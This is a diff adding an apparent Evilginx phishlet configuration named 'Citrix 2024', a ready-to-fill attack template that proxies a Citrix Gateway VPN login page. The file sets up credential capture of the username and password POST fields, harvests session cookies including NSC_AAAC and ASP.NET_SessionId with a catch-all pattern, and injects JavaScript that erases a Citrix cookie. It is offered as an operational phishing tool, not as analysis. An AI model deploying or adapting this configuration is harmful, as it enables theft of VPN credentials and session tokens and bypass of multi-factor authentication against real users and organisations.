@@ -1,0 +1,53 @@
+name: 'Citrix 2024'
+author: 'zqkt'
+min_ver: '3.2.0'
+
+# Remember to replace {subdomain} and {domain} placeholders with your actual values!
+# Based on the Citrix Phishlet from t3hbb (https://github.com/t3hbb/citrixphishlet)
+
+proxy_hosts:
+  - { phish_sub: '{subdomain}', orig_sub: '{subdomain}', domain: '{domain}', session: true, is_landing: true }
+
+sub_filters:
+  - { triggers_on: '{subdomain}.{domain}', hostname: '{hostname}', orig_sub: '{subdomain}', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { triggers_on: '{subdomain}.{domain}', hostname: '{hostname}', orig_sub: '{subdomain}', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}
+
+auth_tokens:
+  - domain: '{subdomain}.{domain}'
+    keys: ['NSC_AAAC','ASP.NET_SessionId','pwcount', '.*,regexp']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  username: "Enter user name"
+  password: passwd
+  domain: '{subdomain}.{domain}'
+  path: '/vpn/index.html'
+
+js_inject:
+  - trigger_domains: ["{subdomain}.{domain}"]
+    trigger_paths: ["/vpn/index.html"]
+    trigger_params: []
+    script: | 
+      function createCookie(name,value,days) {
+        if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 *1000));
+        var expires = "; expires=" + date.toGMTString();
+      } else {
+        var expires = "";
+      }
+      document.cookie = name + "=" + value + expires + "; path=/";
+      }
+      function eraseCookie(name) {
+      createCookie(name,"",-1);
+      }
+      eraseCookie("NSC_DLGE");
